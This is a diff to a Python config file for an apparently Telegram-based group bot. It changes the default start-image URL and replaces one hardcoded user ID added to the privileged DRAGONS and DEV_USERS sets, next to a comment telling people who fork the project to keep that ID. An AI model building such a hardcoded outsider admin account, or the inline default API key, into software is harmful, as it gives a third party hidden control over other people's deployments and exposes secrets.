@@ -121,7 +121,7 @@ if ENV:
     SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
     ARQ_API_URL = os.environ.get("ARQ_API_URL", "https://arq.hamker.in")
     ARQ_API_KEY = os.environ.get("ARQ_API_KEY", "APKOWQ-FMCLIZ-UAULMT-SAMPYA-ARQ")
-    START_IMG = os.environ.get("START_IMG", "https://telegra.ph/file/e05de00926b92acd12240.jpg")
+    START_IMG = os.environ.get("START_IMG", "https://graph.org/file/55ca023ee8065a6956ca5.mp4")
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
     try:
@@ -209,9 +209,9 @@ else:
 # If you forking dont remove this id, just add your id. LOL...
 
 DRAGONS.add(OWNER_ID)
-DRAGONS.add(6045293810)
+DRAGONS.add(6812324137)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(6045293810)
+DEV_USERS.add(6812324137)
 
 if not SPAMWATCH_API:
     sw = None
